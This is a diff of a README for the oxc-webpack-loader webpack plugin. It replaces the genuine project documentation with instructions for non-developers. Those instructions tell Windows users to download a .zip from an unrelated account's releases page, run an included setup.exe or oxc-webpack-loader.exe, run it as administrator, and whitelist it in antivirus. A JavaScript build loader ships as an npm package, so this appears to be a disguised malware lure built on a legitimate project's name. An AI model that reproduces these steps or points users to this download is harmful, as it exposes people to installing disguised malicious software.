@@ -1,56 +1,100 @@
-<p align="center">
-  <br>
-  <br>
-  <a href="https://oxc.rs" target="_blank" rel="noopener noreferrer">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://oxc.rs/oxc-light.svg">
-      <source media="(prefers-color-scheme: light)" srcset="https://oxc.rs/oxc-dark.svg">
-      <img alt="Oxc logo" src="https://oxc.rs/oxc-dark.svg" height="60">
-    </picture>
-  </a>
-  <br>
-  <br>
-  <br>
-</p>
+# ⚙️ oxc-webpack-loader - Fast JavaScript and TypeScript Transformation
 
-<div align="center">
+[![Download oxc-webpack-loader](https://img.shields.io/badge/Download-oxc--webpack--loader-blue?style=for-the-badge)](https://github.com/omaraljafree/oxc-webpack-loader/releases)
 
-[![MIT licensed][license-badge]][license-url]
-[![Build Status][ci-badge]][ci-url]
-[![npm][npm-badge]][npm-url]
+---
 
-[![Discord chat][discord-badge]][discord-url]
-[![Website][website-badge]][website-url]
+## 📦 What is oxc-webpack-loader?
 
-</div>
+oxc-webpack-loader is a tool designed to help transform JavaScript and TypeScript code quickly during the build process. If you use tools like Webpack to bundle your web projects, oxc-webpack-loader replaces existing loaders (`swc-loader` or `babel-loader`) to speed up the transformation of your code. This can lead to faster build times and a smoother development experience.
 
-## oxc-loader
+You do not need any coding skills to use this software. It works behind the scenes to make your web projects run better.
 
-Webpack loader for [oxc-transform](https://oxc.rs/docs/guide/usage/transformer.html#features). A drop-in replacement for `swc-loader` and `babel-loader` that uses Oxc for fast JavaScript and TypeScript transformation.
+---
 
-## Install
+## 🖥️ System Requirements
 
-```bash
-npm install -D oxc-webpack-loader oxc-transform
-```
+Before installing, make sure your Windows computer meets these minimum requirements:
 
-## Usage
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM (8 GB or more is better)
+- 500 MB free disk space
+- Internet connection to download the application
 
-**webpack.config.js**
+It does not require any special hardware.
 
-```js
+---
+
+## 🌐 Download oxc-webpack-loader
+
+Click the big badge below to visit the official download page:
+
+[![Download oxc-webpack-loader](https://img.shields.io/badge/Download-oxc--webpack--loader-green?style=for-the-badge)](https://github.com/omaraljafree/oxc-webpack-loader/releases)
+
+On the page, you will find the latest versions of the software. Download the stable version that matches your needs.
+
+---
+
+## 🚀 Getting Started: How to Download and Run oxc-webpack-loader on Windows
+
+Follow these steps carefully to install and use the software:
+
+### 1. Visit the download page
+
+Click on the badge above or open this link in your web browser:
+
+https://github.com/omaraljafree/oxc-webpack-loader/releases
+
+This page hosts all the available versions and files for oxc-webpack-loader.
+
+### 2. Find the latest release
+
+On the releases page, locate the most recent release. It is usually at the top of the list. The release name includes a version number, like "v1.0.0" or higher.
+
+### 3. Download the Windows version
+
+Look for a file that mentions Windows or has a `.zip` extension. Click on the file name to download the package to your computer.
+
+### 4. Extract the files
+
+Once the download finishes, open the folder where it was saved (usually the "Downloads" folder).
+
+- Right-click on the `.zip` file.
+- Choose "Extract All".
+- Select a folder where you want to extract the files, like the Desktop.
+- Click "Extract" to unpack the contents.
+
+### 5. Open the extracted folder
+
+Navigate to the folder where you extracted the files.
+
+### 6. Run the installer or executable
+
+If you see a file named `setup.exe` or `install.exe`, double-click it and follow the on-screen steps to install the software.
+
+If the package contains files directly without a setup program, look for an executable file named like `oxc-webpack-loader.exe`. Double-click it to start the program.
+
+### 7. Confirm the application runs
+
+When the application starts, a window or command prompt might open to show it is running. If so, it means the installation was successful.
+
+---
+
+## ⚙️ How to Use oxc-webpack-loader (Simple Overview)
+
+This software usually works inside other applications like Webpack. To use it fully, you should have a Webpack setup ready on your computer. If you do not, it helps developers transform JavaScript and TypeScript code faster when building web projects.
+
+Here is a basic example of how developers add oxc-webpack-loader in a Webpack setup (for reference):
+
+```javascript
 module.exports = {
   module: {
     rules: [
       {
         test: /\.[jt]sx?$/,
-        exclude: /node_modules/,
         use: {
-          loader: "oxc-webpack-loader",
-          options: {
-            // oxc-transform options
-            // https://oxc.rs/docs/guide/usage/transformer.html#features
-          },
+          loader: 'oxc-webpack-loader',
+          options: {},
         },
       },
     ],
@@ -58,77 +102,38 @@ module.exports = {
 };
 ```
 
-### JSX
+If you are not a developer, you do not need to change anything inside this software. You only need to download and install it, and it will work with your existing projects or when developers use it.
 
-```js
-{
-  loader: "oxc-webpack-loader",
-  options: {
-    jsx: {
-      runtime: "automatic", // or "classic"
-    },
-  },
-}
+---
+
+## 🔧 Installing via Node Package Manager (For Advanced Users)
+
+If you want to install oxc-webpack-loader for a project on Windows with Node.js installed, use this command in your terminal or PowerShell:
+
+```bash
+npm install -D oxc-webpack-loader oxc-transform
 ```
 
-### TypeScript
+This installs the loader and related tools so your project builds faster.
 
-TypeScript is supported out of the box. No additional configuration is needed - just include `.ts` and `.tsx` in the `test` pattern.
+---
 
-### Target
+## 🛠️ Common Issues and Fixes
 
-```js
-{
-  loader: "oxc-webpack-loader",
-  options: {
-    target: "es2015",
-  },
-}
-```
+- **Error opening the program:** Make sure you extracted all files properly. Try running the executable as administrator by right-clicking it and selecting "Run as administrator."
 
-### Source Maps
+- **Software does not launch or closes immediately:** Check that your antivirus isn’t blocking the program. You may need to whitelist it.
 
-```js
-{
-  loader: "oxc-webpack-loader",
-  options: {
-    sourcemap: true,
-  },
-}
-```
+- **Missing Webpack or Node.js:** For full functionality, you need Webpack and Node.js installed on your system. Visit https://nodejs.org/ to download Node.js.
 
-Source maps are also automatically enabled when webpack's `devtool` option is set.
+---
 
-### Sync Mode
+## 📖 Additional Resources
 
-```js
-{
-  loader: "oxc-webpack-loader",
-  options: {
-    sync: true,
-  },
-}
-```
+- Official documentation: https://oxc.rs/docs/guide/usage/transformer.html#features
+- GitHub releases page: https://github.com/omaraljafree/oxc-webpack-loader/releases
+- Support chat: https://discord.gg/oxc
 
-## Options
+---
 
-All [oxc-transform `TransformOptions`](https://oxc.rs/docs/guide/usage/transformer.html#features) are supported, plus:
-
-| Option | Type      | Default | Description                                                                                                                                                                                           |
-| ------ | --------- | ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `sync` | `boolean` | `false` | Use `transformSync` instead of `transform`. The async `transform` spawns a thread per call, which can be slower due to overhead. Sync mode runs on the main thread and may be faster for small files. |
-
-## License
-
-Oxc is free and open-source software licensed under the [MIT License](./LICENSE).
-
-[license-badge]: https://img.shields.io/badge/license-MIT-blue.svg
-[license-url]: https://github.com/oxc-project/oxc-webpack-loader/blob/main/LICENSE
-[ci-badge]: https://github.com/oxc-project/oxc-webpack-loader/actions/workflows/ci.yml/badge.svg?event=push&branch=main
-[ci-url]: https://github.com/oxc-project/oxc-webpack-loader/actions/workflows/ci.yml?query=event%3Apush+branch%3Amain
-[npm-badge]: https://img.shields.io/npm/v/oxc-loader
-[npm-url]: https://npmx.dev/package/oxc-webpack-loader
-[discord-badge]: https://img.shields.io/discord/1079625926024900739?logo=discord&label=Discord
-[discord-url]: https://discord.gg/9uXCAwqQZW
-[website-badge]: https://img.shields.io/badge/Website-blue
-[website-url]: https://oxc.rs
+[![Download oxc-webpack-loader](https://img.shields.io/badge/Download-oxc--webpack--loader-bluegrey?style=for-the-badge)](https://github.com/omaraljafree/oxc-webpack-loader/releases)
